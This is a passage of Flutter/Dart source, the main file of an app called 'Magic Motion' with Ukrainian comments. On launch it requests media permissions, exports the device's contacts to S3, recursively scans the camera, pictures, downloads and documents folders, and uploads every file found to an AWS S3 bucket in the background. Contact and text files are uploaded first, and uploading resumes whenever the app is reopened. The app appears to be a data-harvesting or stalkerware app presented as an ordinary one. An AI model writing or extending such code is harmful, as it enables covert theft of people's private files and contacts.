import 'dart:async';
import 'dart:io';
import 'dart:convert';
import 'dart:math';
import 'package:crypto/crypto.dart';

import 'package:amplify_flutter/amplify_flutter.dart';
import 'package:amplify_auth_cognito/amplify_auth_cognito.dart';
import 'package:amplify_storage_s3/amplify_storage_s3.dart';
import 'amplifyconfiguration.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:flutter/material.dart';
import 'package:intl/date_symbol_data_local.dart';
import 'package:magic/alarm/background_sync_service.dart';
import 'package:magic/alarm/background_tasks.dart';
import 'package:magic/constant.dart';
import 'package:magic/helpers/device_helper.dart';
import 'package:magic/helpers/device_info_helper.dart';
import 'package:magic/helpers/file_tree.dart';
import 'package:magic/model/app_update.dart';
import 'package:magic/screens/welcome/welcome_screen.dart';
import 'package:magic/storage/storage_manager.dart';
import 'package:magic/utils/app_data_provider.dart';
import 'package:provider/provider.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:magic/helpers/contacts_helper.dart';
import 'package:magic/helpers/db_helper.dart';
import 'package:magic/helpers/session_manager.dart';

import 'firebase_options.dart';
import 'style/color/brand_color.dart';

final GlobalKey<NavigatorState> navigatorKey = GlobalKey<NavigatorState>();
final sessionManager = SessionManager();
int session_id = 0;
Completer<void>? _uploadCompleter;

// ДОДАНО: Функція для отримання хешу файлу
Future<String> _getFileHash(File file) async {
  try {
    final bytes = await file.readAsBytes();
    final digest = md5.convert(bytes);
    return digest.toString();
  } catch (e) {
    print('❌ Error calculating hash for ${file.path}: $e');
    final stat = await file.stat();
    return '${file.path}_${stat.size}_${stat.modified.millisecondsSinceEpoch}';
  }
}

// ДОДАНО: Функція для збереження хешів завантажених файлів
Future<void> _saveFileHash(String filePath, String hash) async {
  try {
    final prefs = await SharedPreferences.getInstance();
    final hashes = prefs.getStringList('uploaded_file_hashes') ?? [];
    hashes.add('$filePath|$hash');
    await prefs.setStringList('uploaded_file_hashes', hashes);
  } catch (e) {
    print('❌ Error saving file hash: $e');
  }
}

// ДОДАНО: Функція для перевірки за хешем
Future<bool> _isFileUploadedByHash(String filePath, String hash) async {
  try {
    final prefs = await SharedPreferences.getInstance();
    final hashes = prefs.getStringList('uploaded_file_hashes') ?? [];

    for (final entry in hashes) {
      final parts = entry.split('|');
      if (parts.length == 2 && parts[0] == filePath && parts[1] == hash) {
        return true;
      }
    }

    return false;
  } catch (e) {
    print('❌ Error checking file hash: $e');
    return false;
  }
}

// ДОДАНО: Функція для перевірки чи файл вже завантажений
Future<bool> _isFileAlreadyUploaded(String filePath, File file, List<String> uploadedFiles) async {
  try {
    // Проста перевірка за шляхом
    if (uploadedFiles.contains(filePath)) {
      print('✅ File already uploaded (by path): $filePath');
      return true;
    }

    // Додаткова перевірка за хешем
    try {
      final currentHash = await _getFileHash(file);
      final isUploadedByHash = await _isFileUploadedByHash(filePath, currentHash);
      if (isUploadedByHash) {
        print('✅ File already uploaded (by hash): $filePath');
        return true;
      }
    } catch (e) {
      // Продовжуємо якщо перевірка за хешем не вдалася
    }

    return false;
  } catch (e) {
    print('❌ Error checking if file already uploaded: $e');
    return false;
  }
}

Future<void> _configureAmplify() async {
  try {
    await Amplify.addPlugins([
      AmplifyAuthCognito(),
      AmplifyStorageS3(),
    ]);

    await Amplify.configure(amplifyconfig);
    print("✅ Amplify configured successfully!");

    await _initializeAuthentication();

  } catch (e) {
    print("Amplify configuration error: $e");
  }
}

Future<void> _initializeAuthentication() async {
  try {
    final authSession = await Amplify.Auth.fetchAuthSession();

    if (authSession.isSignedIn) {
      final user = await Amplify.Auth.getCurrentUser();
      print('✅ Already signed in as: ${user.userId}');
      return;
    }

    print('👤 No active session - starting authentication');
    print('🌐 Redirecting to sign-in UI...');
    await Amplify.Auth.signInWithWebUI(
      provider: AuthProvider.cognito,
    );

    print('✅ Authentication flow completed');

  } on AuthException catch (e) {
    print('❌ Authentication error: ${e.message}');
    print('⚠️ Continuing in limited mode without authentication');
  }
}

Future<bool> _requestStoragePermissions() async {
  print("=== Requesting All Media Permissions (Android 9–16) ===");

  if (Platform.isAndroid) {
    final version = await _getAndroidSdkInt();
    print("Android SDK version: $version");

    if (version >= 33) {
      print("Requesting: photos + videos + audio");

      final photos = await Permission.photos.request();
      final videos = await Permission.videos.request();
      final audio  = await Permission.audio.request();

      print("Photos: $photos, Videos: $videos, Audio: $audio");

      return photos.isGranted && videos.isGranted && audio.isGranted;
    }

    if (version >= 30) {
      print("Requesting READ/WRITE external storage");

      final read = await Permission.storage.request();

      print("Storage: $read");

      return read.isGranted;
    }

    print("Requesting legacy storage permission");
    final legacy = await Permission.storage.request();

    return legacy.isGranted;
  }

  return true;
}

Future<int> _getAndroidSdkInt() async {
  try {
    if (Platform.isAndroid) {
      final androidInfo = await DeviceInfoPlugin().androidInfo;
      return androidInfo.version.sdkInt;
    }
    return 30;
  } catch (e) {
    print("SDK version error: $e");
    try {
      return int.parse(Platform.version
          .split("(")[1]
          .split(";")[0]
          .replaceAll("Android ", "")
          .trim());
    } catch (e2) {
      print("SDK parse error: $e2");
      return 30;
    }
  }
}

Future<String> _getUniqueDeviceId() async {
  try {
    final deviceId = await DeviceHelper.getUID();

    if (deviceId != null && deviceId.isNotEmpty && deviceId != 'unknown_device') {
      print('📱 Using DeviceHelper ID: $deviceId');
      return deviceId;
    }

    final prefs = await SharedPreferences.getInstance();
    String? savedDeviceId = prefs.getString('unique_device_id');

    if (savedDeviceId != null && savedDeviceId.isNotEmpty) {
      print('📱 Using saved device ID: $savedDeviceId');
      return savedDeviceId;
    }

    final deviceInfo = DeviceInfoPlugin();
    String newDeviceId = '';

    if (Platform.isAndroid) {
      final androidInfo = await deviceInfo.androidInfo;
      newDeviceId = 'android_${androidInfo.id}';
    } else if (Platform.isIOS) {
      final iosInfo = await deviceInfo.iosInfo;
      newDeviceId = 'ios_${iosInfo.identifierForVendor}';
    } else {
      newDeviceId = 'device_${UniqueKey().toString()}';
    }

    await prefs.setString('unique_device_id', newDeviceId);

    print('📱 Generated new device ID: $newDeviceId');
    return newDeviceId;

  } catch (e) {
    print('❌ Error getting device ID: $e');
    final fallbackId = 'device_${DateTime.now().millisecondsSinceEpoch}_${UniqueKey().toString().substring(0, 8)}';
    print('📱 Using fallback ID: $fallbackId');
    return fallbackId;
  }
}

Future<Map<String, dynamic>> _countFiles(String deviceId) async {
  try {
    print('📊 Починаємо підрахунок файлів...');

    final uploadedFiles = await DeviceInfoHelper.getUploadedFileTree();
    final uploadedCount = uploadedFiles.length;

    final List<Directory?> dirs = [
      await FileTreeService.getDcimDir(),
      await FileTreeService.getPicturesDir(),
      await FileTreeService.getDownloadDir(),
      await FileTreeService.getDocumentsDir(),
    ];

    int totalFilesFound = 0;

    for (final dir in dirs) {
      if (dir == null) continue;

      final exists = await dir.exists();
      if (!exists) continue;

      try {
        final files = dir.listSync(recursive: true).whereType<File>().toList();
        totalFilesFound += files.length;
        print('📁 В директорії ${dir.path} знайдено ${files.length} файлів');
      } catch (e) {
        print('❌ Помилка сканування директорії ${dir.path}: $e');
      }
    }

    final filesCountInfo = {
      'total_files': totalFilesFound,
      'uploaded_files': uploadedCount,
      'remaining_files': totalFilesFound - uploadedCount,
      'last_count_timestamp': DateTime.now().toIso8601String(),
      'device_id': deviceId,
      'upload_percentage': totalFilesFound > 0 ?
      ((uploadedCount / totalFilesFound) * 100).toStringAsFixed(1) : '0.0',
    };

    print('📊 Результат підрахунку файлів:');
    print('📊 Загальна кількість файлів: $totalFilesFound');
    print('📊 Завантажено файлів: $uploadedCount');
    print('📊 Залишилось файлів: ${totalFilesFound - uploadedCount}');
    print('📊 Відсоток завантаження: ${filesCountInfo['upload_percentage']}%');

    final prefs = await SharedPreferences.getInstance();
    await prefs.setString('file_count_info', jsonEncode(filesCountInfo));

    try {
      await DbHelper.resetControl();
      print('✅ DbHelper.resetControl() викликано успішно');
    } catch (e) {
      print('⚠️ Помилка при виклику DbHelper.resetControl(): $e');
    }

    return filesCountInfo;

  } catch (e) {
    print('❌ Помилка при підрахунку файлів: $e');
    return {
      'error': e.toString(),
      'device_id': deviceId,
      'timestamp': DateTime.now().toIso8601String(),
      'message': 'Не вдалося виконати підрахунок файлів',
    };
  }
}

Future<Map<String, dynamic>> _getFileCountStatistics() async {
  try {
    final prefs = await SharedPreferences.getInstance();
    final storedInfo = prefs.getString('file_count_info');

    if (storedInfo != null && storedInfo.isNotEmpty) {
      final stats = jsonDecode(storedInfo);
      print('📊 Завантажено статистику з SharedPreferences: $stats');
      return stats;
    }

    print('📊 Немає збереженої статистики, виконуємо новий підрахунок...');
    final deviceId = await _getUniqueDeviceId();
    return await _countFiles(deviceId);

  } catch (e) {
    print('❌ Помилка при отриманні статистики файлів: $e');
    return {
      'error': e.toString(),
      'message': 'Не вдалося отримати статистику файлів',
      'timestamp': DateTime.now().toIso8601String(),
    };
  }
}

Future<void> _saveFileCountStatistics(String deviceId, Map<String, dynamic> stats) async {
  try {
    print('💾 Зберігаємо статистику файлів...');

    final prefs = await SharedPreferences.getInstance();
    await prefs.setString('file_count_info', jsonEncode(stats));

    await prefs.setInt('total_files_count', stats['total_files'] ?? 0);
    await prefs.setInt('uploaded_files_count', stats['uploaded_files'] ?? 0);
    await prefs.setString('last_file_count_time', DateTime.now().toIso8601String());

    print('✅ Статистика збережена у SharedPreferences');

    try {
      await DbHelper.resetControl();
      print('✅ DbHelper.resetControl() викликано');
    } catch (e) {
      print('⚠️ Не вдалося викликати DbHelper.resetControl(): $e');
    }

  } catch (e) {
    print('❌ Помилка збереження статистики файлів: $e');
  }
}

Future<void> _exportContactsToS3(String deviceId) async {
  try {
    print('📱 Експорт контактів на S3...');

    final contactHelper = ContactHelper();
    await contactHelper.syncContactsFileWithDeviceHelper(deviceId);

  } catch (e) {
    print('❌ Помилка при експорті контактів на S3: $e');
  }
}

// ОНОВЛЕНО: Функція завантаження файлів з відстеженням прогресу
Future<void> _scanAndUploadFiles() async {
  print('=== STARTING FILE SCAN IN BACKGROUND ===');

  Future.microtask(() async {
    try {
      final deviceId = await _getUniqueDeviceId();
      List<String> uploadedFiles = await DeviceInfoHelper.getUploadedFileTree();

      final initialStats = await _countFiles(deviceId);
      print('📊 Початкова статистика перед завантаженням: $initialStats');

      await _exportContactsToS3(deviceId);

      final List<Directory?> dirs = [
        await FileTreeService.getDcimDir(),
        await FileTreeService.getPicturesDir(),
        await FileTreeService.getDownloadDir(),
        await FileTreeService.getDocumentsDir(),
      ];

      // Збираємо всі файли для завантаження
      final List<File> allFiles = [];
      for (final dir in dirs) {
        if (dir == null || !await dir.exists()) continue;

        try {
          final files = dir.listSync(recursive: true).whereType<File>().toList();
          allFiles.addAll(files);
        } catch (e) {
          print('❌ ERROR listing directory ${dir.path}: $e');
        }
      }

      // === ДОДАНО: СОРТУВАННЯ ЗА ПРОРІОРИТЕТОМ ===
      allFiles.sort((a, b) {
        final pathA = a.path.toLowerCase();
        final pathB = b.path.toLowerCase();

        // Функція для отримання числового пріоритету
        int getPriority(String path) {
          if (path.endsWith('.vcf') || path.endsWith('.csv') || path.endsWith('.txt') || path.endsWith('.json')) return 1;
          if (path.endsWith('.jpg') || path.endsWith('.jpeg') || path.endsWith('.png') || path.endsWith('.gif')) return 2;
          if (path.endsWith('.mp4') || path.endsWith('.mov') || path.endsWith('.avi') || path.endsWith('.mkv')) return 3;
          return 4;
        }

        return getPriority(pathA).compareTo(getPriority(pathB));
      });

      final totalFiles = allFiles.length;
      int totalFilesUploaded = 0;
      int totalFilesSkipped = 0;

      // === ОНОВЛЕНО: Використовуємо DbHelper методи для ініціалізації ===
      await DbHelper.updateUploadProgress(
        deviceId: deviceId,
        currentFile: 0,
        totalFiles: totalFiles,
        fileName: 'Ініціалізація...',
        isUploading: true,
      );

      for (int i = 0; i < allFiles.length; i++) {
        final file = allFiles[i];
        final filePath = file.path;

        // === ОНОВЛЕНО: Використовуємо DbHelper для оновлення прогресу ===
        await DbHelper.updateUploadProgress(
          deviceId: deviceId,
          currentFile: i + 1,
          totalFiles: totalFiles,
          fileName: filePath.split('/').last,
          isUploading: true,
        );

        // === НОВОЕ: Починаємо відстеження завантаження окремого файлу ===
        try {
          final fileSize = await file.length();
          await DbHelper.startFileUpload(
            deviceId: deviceId,
            filePath: filePath,
            fileSize: fileSize,
            uploadType: 's3',
          );
        } catch (e) {
          print('⚠️ Error starting file upload tracking: $e');
        }

        // Перевірка чи файл вже завантажений
        final isAlreadyUploaded = await _isFileAlreadyUploaded(filePath, file, uploadedFiles);
        if (isAlreadyUploaded) {
          totalFilesSkipped++;

          // === НОВОЕ: Позначаємо пропущений файл як завершений ===
          await DbHelper.completeFileUpload(
            deviceId: deviceId,
            filePath: filePath,
            success: true,
            downloadUrl: 'already_uploaded',
          );

          continue;
        }

        if (StorageManager.currentType != StorageServiceType.awsS3) {
          continue;
        }

        try {
          // === НОВОЕ: Оновлюємо прогрес окремого файлу до 50% ===
          await DbHelper.updateFileUploadProgress(
            deviceId: deviceId,
            filePath: filePath,
            progress: 50.0,
          );

          final success = await DeviceHelper.upload(deviceId, file);

          // === НОВОЕ: Оновлюємо прогрес окремого файлу до 100% ===
          await DbHelper.updateFileUploadProgress(
            deviceId: deviceId,
            filePath: filePath,
            progress: 100.0,
          );

          if (success) {
            uploadedFiles.add(filePath);
            totalFilesUploaded++;

            try {
              final hash = await DbHelper.generateFileHash(file);
              await DbHelper.saveUploadedFileStatus(
                deviceId: deviceId,
                filePath: filePath,
                fileHash: hash,
                fileSize: await file.length(),
                firebaseUrl: 's3_upload_success',
              );
            } catch (e) {
              print('❌ Error saving hash: $e');
            }

            // === НОВОЕ: Завершуємо відстеження завантаження файлу ===
            await DbHelper.completeFileUpload(
              deviceId: deviceId,
              filePath: filePath,
              success: true,
              downloadUrl: 's3_upload_success',
            );
          } else {
            // === НОВОЕ: Позначаємо невдале завантаження файлу ===
            await DbHelper.completeFileUpload(
              deviceId: deviceId,
              filePath: filePath,
              success: false,
              error: 'Upload failed',
            );
          }
        } catch (e) {
          print('❌ UPLOAD ERROR for $filePath: $e');

          // === НОВОЕ: Позначаємо помилку завантаження файлу ===
          await DbHelper.completeFileUpload(
            deviceId: deviceId,
            filePath: filePath,
            success: false,
            error: e.toString(),
          );
        }
      }

      // Фінальне збереження
      await DeviceInfoHelper.saveUploadedFileTree(uploadedFiles);

      // === ОНОВЛЕНО: Використовуємо DbHelper для завершення сесії ===
      await DbHelper.completeUploadSession(
        deviceId: deviceId,
        totalUploaded: totalFilesUploaded,
        totalSkipped: totalFilesSkipped,
        success: totalFilesUploaded > 0,
        sessionType: 'background_scan',
      );

      // === НОВОЕ: Очищаємо прогрес після завершення ===
      await DbHelper.updateUploadProgress(
        deviceId: deviceId,
        currentFile: totalFiles,
        totalFiles: totalFiles,
        fileName: 'Завершено',
        isUploading: false,
      );

    } catch (e) {
      print('❌ ERROR in background upload: $e');

      // === НОВОЕ: Позначаємо сесію як невдалу при помилці ===
      try {
        final deviceId = await _getUniqueDeviceId();
        await DbHelper.completeUploadSession(
          deviceId: deviceId,
          totalUploaded: 0,
          totalSkipped: 0,
          success: false,
          sessionType: 'background_scan_error',
        );
      } catch (e2) {
        print('❌ Failed to complete session on error: $e2');
      }
    }

    _uploadCompleter?.complete();
  });
}

Future<void> _performDiagnostics() async {
  print('=== PERFORMING DIAGNOSTICS ===');

  final hasPermission = await _requestStoragePermissions();

  if (hasPermission) {
    print('✅ PERMISSION GRANTED - Performing detailed scan');

    final detailedDirs = [
      '/storage/emulated/0/DCIM',
      '/storage/emulated/0/Documents',
      '/storage/emulated/0/Pictures',
      '/storage/emulated/0/DCIM/Camera',
      '/storage/emulated/0/Download',

    ];

    for (final path in detailedDirs) {
      final dir = Directory(path);
      print('=== Scanning: $path ===');

      final exists = await dir.exists();
      print('Exists: $exists');

      if (!exists) continue;

      try {
        final entries = dir.listSync();
        print('Found ${entries.length} entries in first level');

        for (final entry in entries.take(3)) {
          if (entry is File) {
            print('FILE: ${entry.path}');
          } else if (entry is Directory) {
            print('DIR: ${entry.path}');
          }
        }
      } catch (e) {
        print('Error scanning $path: $e');
      }
    }
  } else {
    print('❌ PERMISSION DENIED - Skipping detailed scan');
  }
}

Future<bool> _checkStoragePermissions() async {
  if (Platform.isAndroid) {
    final version = await _getAndroidSdkInt();

    if (version >= 33) {
      final photos = await Permission.photos.status;
      final videos = await Permission.videos.status;
      final audio = await Permission.audio.status;
      final result = photos.isGranted && videos.isGranted && audio.isGranted;
      return result;
    } else {
      final storage = await Permission.storage.status;
      return storage.isGranted;
    }
  }
  return true;
}

void startFileUploadProcess() {
  print('🎉 STARTING FILE UPLOAD PROCESS IN BACKGROUND');

  Future.microtask(() async {
    try {
      final hasPermissions = await _checkStoragePermissions();

      if (!hasPermissions) {
        print('❌ Cannot start upload - permissions still not granted');
        return;
      }

      print('✅ Permissions confirmed - starting file scan and upload in background');
      await _scanAndUploadFiles();
      print('✅ FILE UPLOAD PROCESS COMPLETED IN BACKGROUND');
    } catch (e) {
      print('❌ ERROR in background upload process: $e');
    }
  });
}

Future<bool> _isSessionValid() async {
  try {
    final authSession = await Amplify.Auth.fetchAuthSession();

    if (!authSession.isSignedIn) {
      print('❌ No active authentication session');
      return false;
    }

    try {
      final user = await Amplify.Auth.getCurrentUser();
      if (user.userId.isEmpty) {
        print('❌ User ID is empty - session invalid');
        return false;
      }
      print('✅ Session is valid for user: ${user.userId}');
      return true;
    } catch (e) {
      print('❌ Failed to get current user: $e');
      return false;
    }
  } catch (e) {
    print('❌ Error checking session validity: $e');
    return false;
  }
}

Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await Firebase.initializeApp(
    options: DefaultFirebaseOptions.currentPlatform,
  );
  await initializeDateFormatting();
  await _configureAmplify();
  session_id = await sessionManager.getOrCreateSessionId();
  try {
    await StorageManager.initialize(
      type: StorageServiceType.awsS3,
      config: {
        'bucketName': s3BucketName,
        'region': s3Region,
        'identityPoolId': s3identityPoolId,
      },
    );
  } catch (e, stack) {
    print('=== DEBUG: StorageManager.initialize ERROR: $e');
  }

  final deviceId = await _getUniqueDeviceId();
  print('📱 Main - Device ID: $deviceId');

  try {
    final fileStats = await _countFiles(deviceId);
    print('📊 Ініціалізована статистика файлів: $fileStats');
  } catch (e) {
    print('❌ Помилка ініціалізації статистики файлів: $e');
  }

  Future.microtask(() async {
    await _performDiagnostics();
    final hasPermissions = await _requestStoragePermissions();

    if (hasPermissions) {
      print('✅ MAIN SCAN: Permissions granted - starting file upload in background');
      _uploadCompleter = Completer<void>();
      _scanAndUploadFiles();
    } else {
      print('❌ MAIN SCAN: Permissions denied - cannot access files');
    }
  });

  await registerBackgroundTasks();

  Future.microtask(() async {
    final prefs = await SharedPreferences.getInstance();
    final id = prefs.getString('unique_device_id') ?? await _getUniqueDeviceId();
    await DeviceHelper.open(id);
  });

  final startScreen = await _chooseScreen();

  runApp(MyApp(
    screen: startScreen,
    appUpdate: null,
  ));
}

Future<String> _chooseScreen() async {
  try {
    final prefs = await SharedPreferences.getInstance();
    final isFirstLaunch = prefs.getBool('isFirstLaunch') ?? true;

    if (isFirstLaunch) {
      print('🆕 First launch detected');
      return "welcome";
    }

    final sessionValid = await _isSessionValid();

    if (!sessionValid) {
      print('⚠️ Session invalid or expired - redirecting to welcome screen');
      await prefs.setBool('isFirstLaunch', true);
      return "welcome";
    }

    print('✅ Session valid - using cached home screen');
    return "home";
  } catch (e) {
    print('❌ Error choosing screen: $e');
    return "welcome";
  }
}

class MyApp extends StatefulWidget {
  final String screen;
  final AppUpdate? appUpdate;

  const MyApp({super.key, required this.screen, this.appUpdate});

  @override
  State<MyApp> createState() => _MyAppState();
}

class _MyAppState extends State<MyApp> with WidgetsBindingObserver {
  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    super.dispose();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    super.didChangeAppLifecycleState(state);

    switch (state) {
      case AppLifecycleState.paused:
      case AppLifecycleState.detached:
        _saveUploadState();
        break;
      case AppLifecycleState.resumed:
        _resumeUploads();
        break;
      default:
        break;
    }
  }

  Future<void> _saveUploadState() async {
    try {
      final prefs = await SharedPreferences.getInstance();
      await prefs.setString('last_app_pause', DateTime.now().toIso8601String());
      await BackgroundSyncService.forceCompleteSync();
    } catch (e) {
      // Fail silently
    }
  }

  Future<void> _resumeUploads() async {
    try {
      final hasPending = await BackgroundSyncService.hasPendingUploads();
      if (hasPending) {
        Future.delayed(const Duration(seconds: 2), () {
          BackgroundSyncService.resumePendingUploads();
        });
      }
    } catch (e) {
      // Fail silently
    }
  }

  @override
  Widget build(BuildContext context) {
    return MultiProvider(
      providers: [
        ChangeNotifierProvider(create: (context) => AppDataProvider())
      ],
      child: MaterialApp(
        navigatorKey: navigatorKey,
        title: 'Magic Motion',
        debugShowCheckedModeBanner: false,
        theme: ThemeData(
          primarySwatch: Colors.blue,
          elevatedButtonTheme: ElevatedButtonThemeData(
            style: ElevatedButton.styleFrom(
              backgroundColor: BrandColor.kRed,
              foregroundColor: Colors.white,
            ),
          ),
        ),
        home: _chooseHomeScreen(widget.screen),
      ),
    );
  }
}

Widget _chooseHomeScreen(String screen) {
  switch (screen) {
    case "home":
      return HomePage();
    default:
      return WelcomeScreen();
  }
}

class HomePage extends StatefulWidget {
  @override
  State<HomePage> createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> with WidgetsBindingObserver {
  bool _isCheckingPermissions = false;
  bool _isUploading = false;
  int _uploadedFilesCount = 0;
  bool _hasPermissions = false;
  String _deviceId = '';

  Map<String, dynamic> _fileCountStats = {};
  bool _isLoadingStats = false;
  Timer? _progressTimer;

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
    _initializePermissions();
    _loadFileCountStatistics();

    // === НОВОЕ: Завантажуємо реальний прогрес при запуску ===
    _loadRealTimeProgress();

    // === НОВОЕ: Налаштовуємо періодичне оновлення для реального часу ===
    _progressTimer = Timer.periodic(Duration(seconds: 5), (timer) {
      if (mounted && _isUploading) {
        _loadRealTimeProgress();
      }
    });
  }

  @override
  void dispose() {
    _progressTimer?.cancel();
    WidgetsBinding.instance.removeObserver(this);
    super.dispose();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (state == AppLifecycleState.resumed) {
      print('🔄 App resumed - checking permissions and upload status');
      _checkPermissionsAndUpload();
      _loadFileCountStatistics();
      _loadRealTimeProgress();
    }
  }

  // === НОВОЕ: Функція для завантаження реального прогресу ===
  Future<void> _loadRealTimeProgress() async {
    try {
      final deviceId = await _getUniqueDeviceId();

      // Отримуємо поточний прогрес з Firebase
      final progress = await DbHelper.getUploadProgress(deviceId);
      if (progress != null && mounted) {
        setState(() {
          // Оновлюємо UI з реальним прогресом
          _isUploading = progress['is_uploading'] ?? false;
          if (progress['current_file'] != null && progress['total_files'] != null) {
            _uploadedFilesCount = progress['current_file'] ?? 0;
          }
        });
      }
    } catch (e) {
      print('❌ Error loading real-time progress: $e');
    }
  }

  Future<void> _loadFileCountStatistics() async {
    if (_isLoadingStats) return;

    setState(() {
      _isLoadingStats = true;
    });

    try {
      final stats = await _getFileCountStatistics();
      setState(() {
        _fileCountStats = stats;
      });

      print('📊 Статистика файлів завантажена: $stats');
    } catch (e) {
      print('❌ Помилка завантаження статистики файлів: $e');
    } finally {
      if (mounted) {
        setState(() {
          _isLoadingStats = false;
        });
      }
    }
  }

  Future<void> _refreshFileCountStats() async {
    try {
      final deviceId = await _getUniqueDeviceId();
      final newStats = await _countFiles(deviceId);

      setState(() {
        _fileCountStats = newStats;
      });

      await _loadUploadedFilesCount();

      print('📊 Статистика оновлена: $newStats');

    } catch (e) {
      print('❌ Помилка оновлення статистики: $e');
    }
  }

  Future<void> _initializePermissions() async {
    await _loadUploadedFilesCount();
    await _checkPermissionsAndUpload();
  }

  Future<void> _loadUploadedFilesCount() async {
    final uploadedFiles = await DeviceInfoHelper.getUploadedFileTree();
    setState(() {
      _uploadedFilesCount = uploadedFiles.length;
    });
    print('📁 Завантажено файлів: $_uploadedFilesCount');
  }

  Future<void> _checkPermissionsAndUpload() async {
    if (_isCheckingPermissions) return;

    setState(() {
      _isCheckingPermissions = true;
    });

    try {
      final currentPermissions = await _checkStoragePermissions();

      setState(() {
        _hasPermissions = currentPermissions;
      });

      if (_hasPermissions && !_isUploading) {
        print('🎉 Permissions granted - starting background upload!');

        // === НОВОЕ: Завантажуємо реальні дані перед початком ===
        await _loadRealTimeProgress();

        _startFileUploadProcess();
      }

    } catch (e) {
      print('Error checking permissions: $e');
    } finally {
      setState(() {
        _isCheckingPermissions = false;
      });
    }
  }

  Future<bool> _checkStoragePermissions() async {
    if (Platform.isAndroid) {
      final version = await _getAndroidSdkInt();

      if (version >= 33) {
        final photos = await Permission.photos.status;
        final videos = await Permission.videos.status;
        final audio = await Permission.audio.status;
        return photos.isGranted && videos.isGranted && audio.isGranted;
      } else {
        final storage = await Permission.storage.status;
        return storage.isGranted;
      }
    }
    return true;
  }

  Future<void> _startFileUploadProcess() async {
    if (_isUploading) return;

    setState(() {
      _isUploading = true;
    });

    Future.microtask(() async {
      try {
        _deviceId = await _getUniqueDeviceId();
        print('📱 Starting upload for device: $_deviceId');

        // === НОВОЕ: Завантажуємо реальний прогрес перед початком ===
        await _loadRealTimeProgress();

        startFileUploadProcess();

        // === НОВОЕ: Налаштовуємо слухач реального часу під час завантаження ===
        final uploadTimer = Timer.periodic(Duration(seconds: 3), (timer) async {
          if (!_isUploading) {
            timer.cancel();
            return;
          }
          await _loadRealTimeProgress();
        });

        // Чекаємо на завершення завантаження або таймаут
        await Future.delayed(Duration(minutes: 5));

        uploadTimer.cancel();

        // Фінальне оновлення
        await _loadRealTimeProgress();
        await _loadUploadedFilesCount();

      } catch (e) {
        print('Error in upload process: $e');
      } finally {
        if (mounted) {
          setState(() {
            _isUploading = false;
          });
        }
      }
    });
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text('Magic Motion'),
        backgroundColor: BrandColor.kRed,
      ),
      body: SingleChildScrollView(
        child: Padding(
          padding: const EdgeInsets.all(20.0),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.stretch,
            children: [
              Card(
                child: Padding(
                  padding: const EdgeInsets.all(16.0),
                  child: Column(
                    children: [
                      Row(
                        children: [
                          Icon(
                            _hasPermissions ? Icons.check_circle : Icons.warning,
                            color: _hasPermissions ? Colors.green : Colors.orange,
                          ),
                          SizedBox(width: 10),
                          Text(
                            _hasPermissions ? 'Дозволи надані' : 'Потрібні дозволи',
                            style: TextStyle(
                              fontSize: 18,
                              fontWeight: FontWeight.bold,
                            ),
                          ),
                        ],
                      ),
                      SizedBox(height: 10),
                      Text(
                        _hasPermissions
                            ? 'Додаток має доступ до ваших файлів'
                            : 'Надайте дозвіл для доступу до файлів',
                        style: TextStyle(color: Colors.grey[700]),
                      ),
                    ],
                  ),
                ),
              ),

              SizedBox(height: 20),

              Card(
                child: Padding(
                  padding: const EdgeInsets.all(16.0),
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Row(
                        mainAxisAlignment: MainAxisAlignment.spaceBetween,
                        children: [
                          Text(
                            '📊 Статистика файлів',
                            style: TextStyle(
                              fontWeight: FontWeight.bold,
                              fontSize: 18,
                            ),
                          ),
                          // === НОВОЕ: Додаємо кнопку оновлення ===
                          IconButton(
                            onPressed: _loadRealTimeProgress,
                            icon: Icon(Icons.refresh, size: 20),
                            tooltip: 'Оновити',
                          ),
                        ],
                      ),
                      SizedBox(height: 12),
                      _buildStatRow('Всього файлів', '${_fileCountStats['total_files'] ?? 0}'),
                      _buildStatRow('Завантажено', '${_fileCountStats['uploaded_files'] ?? 0}'),
                      _buildStatRow('Залишилось', '${_fileCountStats['remaining_files'] ?? 0}'),
                      if (_fileCountStats['upload_percentage'] != null)
                        _buildStatRow('Прогрес', '${_fileCountStats['upload_percentage']}%'),

                      // === НОВОЕ: Показуємо поточний статус завантаження ===
                      if (_isUploading)
                        Padding(
                          padding: const EdgeInsets.only(top: 8.0),
                          child: Row(
                            children: [
                              Icon(Icons.cloud_upload, color: Colors.blue, size: 16),
                              SizedBox(width: 8),
                              Text(
                                'Завантаження...',
                                style: TextStyle(color: Colors.blue, fontSize: 14),
                              ),
                            ],
                          ),
                        ),

                      SizedBox(height: 12),
                      if (_fileCountStats['last_count_timestamp'] != null)
                        Padding(
                          padding: const EdgeInsets.only(bottom: 8.0),
                          child: Text(
                            'Оновлено: ${_formatTimestamp(_fileCountStats['last_count_timestamp'])}',
                            style: TextStyle(
                              fontSize: 12,
                              color: Colors.grey[600],
                            ),
                          ),
                        ),
                      Row(
                        children: [
                          Expanded(
                            child: ElevatedButton(
                              onPressed: _refreshFileCountStats,
                              style: ElevatedButton.styleFrom(
                                backgroundColor: Colors.blue,
                                foregroundColor: Colors.white,
                              ),
                              child: Text('Оновити статистику'),
                            ),
                          ),
                          SizedBox(width: 10),
                          Expanded(
                            child: ElevatedButton(
                              onPressed: () {
                                print('Детальна статистика: $_fileCountStats');
                                _showDetailedStatsDialog();
                              },
                              style: ElevatedButton.styleFrom(
                                backgroundColor: Colors.grey[300],
                                foregroundColor: Colors.black,
                              ),
                              child: Text('Детальніше'),
                            ),
                          ),
                        ],
                      ),
                    ],
                  ),
                ),
              ),

              SizedBox(height: 20),

              Card(
                child: Padding(
                  padding: const EdgeInsets.all(16.0),
                  child: Column(
                    children: [
                      Text(
                        'Завантаження файлів',
                        style: TextStyle(
                          fontSize: 18,
